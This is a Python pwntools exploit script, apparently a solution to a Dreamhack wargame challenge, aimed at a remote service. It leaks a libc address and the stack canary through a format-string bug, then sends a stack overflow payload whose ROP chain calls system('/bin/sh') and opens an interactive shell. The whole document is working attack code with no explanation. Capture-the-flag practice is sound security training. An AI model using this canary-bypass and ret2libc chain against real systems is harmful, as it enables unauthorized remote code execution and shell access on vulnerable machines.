from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 18261
r = remote(HOST, PORT)

r.sendlineafter(b'> ', b'%10$p %17$p')
r.recvuntil(b'hello, ')
libc, canary = list(map(lambda x: int(x, 16), r.recvline().strip().decode().split()))
libc -= 0x1ed5c0

pop_rdi = libc + 0x23b6a
system = libc + 0x52290
binsh = libc + 0x1b45bd
ret = libc + 0x22679

r.sendlineafter(b'> ', b'7274')
payload = flat([
    b'A'*24,
    canary,
    0,
    ret,
    pop_rdi, binsh,
    system
])
r.sendlineafter(b': ', payload)

r.interactive()